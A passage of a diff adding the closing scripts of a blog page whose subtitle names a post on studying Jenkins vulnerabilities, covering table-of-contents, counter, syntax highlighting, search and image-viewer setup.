+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Jenkins相关漏洞学习（二）&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
